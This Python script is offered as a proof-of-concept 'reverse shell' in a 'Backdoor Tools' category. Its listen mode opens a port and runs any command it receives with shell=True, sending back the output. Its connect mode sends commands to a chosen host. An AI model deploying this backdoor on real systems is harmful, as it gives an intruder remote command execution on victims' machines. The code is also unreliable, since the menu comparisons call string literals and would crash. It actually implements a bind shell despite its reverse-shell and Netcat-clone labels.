# This is a proof of concept for a simple reverse shell using Python.
# The script can be run in two modes: listen mode and connect mode.
# In listen mode, the script listens on a specified port for incoming connections.
# In connect mode, the script connects to a specified host and port.
# The script can execute commands on the target machine and send back the output.

import socket
import subprocess
import platform
from internal_library.asset_functions import clear_screen
from time import sleep


tool_details = {
    "name": "Reverse Shell", # The name of your tool. [REQUIRED]
    "filename": "reverse_shell.py",  # The name of the file containing your tool. [REQUIRED]
    "category": "Backdoor Tools", # [REQUIRED]
    "version": "0.1 Alpha", # [RECOMMENDED]
    "description": "A simple POC reverse shell script for python." # [REQUIRED]
}

menu_output = """
[L] Listen Mode 
[C] Connect Mode
[3] Exit
"""

def open_new_terminal(command): # Open new terminal
    """
    Opens a new terminal and runs the given command based on the operating system.
    """
    os_name = platform.system()
    if os_name == 'Windows':
        subprocess.Popen(['start', 'cmd', '/k'] + command, shell=True)
    elif os_name == 'Linux':
        subprocess.Popen(['gnome-terminal', '--'] + command)
    elif os_name == 'Darwin':  # macOS
        subprocess.Popen(['open', '-a', 'Terminal.app', '--args'] + command)

def listen_mode(port): # Listen mode
    """
    Modified listen mode to execute received commands and send back the output.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', port))
        s.listen()
        print(f"Listening on port {port}. Waiting for connections...")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                data = conn.recv(1024).decode().strip()
                if not data:
                    break
                print(f"Executing command: {data}")
                # Execute the command and capture the output
                try:
                    output = subprocess.check_output(data, stderr=subprocess.STDOUT, shell=True)
                except subprocess.CalledProcessError as e:
                    output = e.output
                # Send the command output back to the connector
                conn.sendall(output)

def connect_mode(host, port): # Connect mode
    """
    Starts the application in connect mode, attempting to connect to the specified host and port.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host, port))
            print(f"Connected to {host}:{port}")
            while True:
                message = input("Send: ").encode()
                s.sendall(message)
                data = s.recv(1024)
                print(f"Received: {data.decode()}")
        except ConnectionRefusedError:
            print("Connection failed. Please check the host and port and try again.")

def main():
    """
    Main function to run the Netcat clone. Handles user inputs and switches between modes.
    """
    while True:
        choice = input("Select an option: ").upper() # Get user input and convert to uppercase

        if choice == "L"():
            port = int(input("Enter the port to listen on: ")) # Get the port number from the user
            listen_mode(port)
        elif choice == "C"():
            host = input("Enter the host to connect to: ") # Get the host to connect to
            port = int(input("Enter the port to connect to: ")) # Get the port to connect to
            connect_mode(host, port)
        elif choice == "Q" or choice == "3" or choice == "EXIT"(): # Exit the program
            print("Exiting Netcat Clone.")
            sleep(2)
            exit()
        else:
            print("Invalid option, please try again.")

if __name__ == "__main__":
    while True:
        clear_screen()
        main()
